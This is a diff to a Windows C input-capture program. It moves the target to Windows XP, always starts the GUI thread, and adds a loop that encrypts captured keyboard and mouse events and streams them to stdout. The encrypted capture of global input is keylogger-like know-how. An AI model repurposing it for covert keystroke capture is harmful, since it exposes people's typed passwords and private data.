@@ -1,4 +1,4 @@
-#define _WIN32_WINNT _WIN32_WINNT_WIN7
+#define _WIN32_WINNT _WIN32_WINNT_WINXP
 #define NTDDI_VERSION NTDDI_VERSION_FROM_WIN32_WINNT
 /**
  * Software made by a person, using examples from other people,
@@ -9,7 +9,9 @@
 #include <Windows.h>
 #include "keyboardhook.h"
 #include "mousehook.h"
+#include "inputhandler.h"
 #include "gui.h"
+#include "encryption.h"
 /**
  * TODO:
  *  - Finalize spec for stdout format and mouse/key names/codes
@@ -44,10 +46,8 @@ void setup()
 }
 
 
-#ifdef WITH_GUI
 DWORD WINAPI gui_thread_loop(void* arg)
 {
-
     initialize_window();
 
     MSG msg;
@@ -59,21 +59,11 @@ DWORD WINAPI gui_thread_loop(void* arg)
 
     return EXIT_SUCCESS;
 }
-#endif
 
 
 DWORD WINAPI input_thread_loop(void* arg)
 {
     setup();
-
-#ifdef WITH_GUI
-    HANDLE gui_thread = CreateThread(NULL, 0, gui_thread_loop, NULL, 0,
-            NULL);
-    if (gui_thread == NULL) {
-        fprintf(stderr, "[-] Failed to create gui thread\n");
-        exit(-4);
-    }
-#endif
 
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
@@ -82,6 +72,29 @@ DWORD WINAPI input_thread_loop(void* arg)
         DispatchMessage(&msg);
     }
 
+    return EXIT_SUCCESS;
+}
+
+
+int loop_until_exit()
+{
+    // TODO: More sophisticated looping and queueing
+    char *plaintext;
+    unsigned char cipher_text[BUF_LEN] = {0};
+    while (1) {
+        plaintext = dequeue_output();
+        if (plaintext == NULL) {
+            Sleep(5);
+            continue;
+        }
+        while (plaintext != NULL) {
+            output_encrypt(cipher_text, plaintext, BUF_LEN);
+            fwrite(cipher_text, sizeof(unsigned char), BUF_LEN, stdout);
+            plaintext = dequeue_output();
+        }
+        fflush(stdout);
+        Sleep(2);
+    }
     return EXIT_SUCCESS;
 }
 
@@ -104,8 +117,13 @@ int main()
         exit(-3);
     }
 
-    WaitForSingleObject(input_thread, INFINITE);
+    HANDLE gui_thread = CreateThread(NULL, 0, gui_thread_loop, NULL, 0,
+            NULL);
+    if (gui_thread == NULL) {
+        fprintf(stderr, "[-] Failed to create gui thread\n");
+        exit(-4);
+    }
 
-    return EXIT_SUCCESS;
+    return loop_until_exit();
 }
 
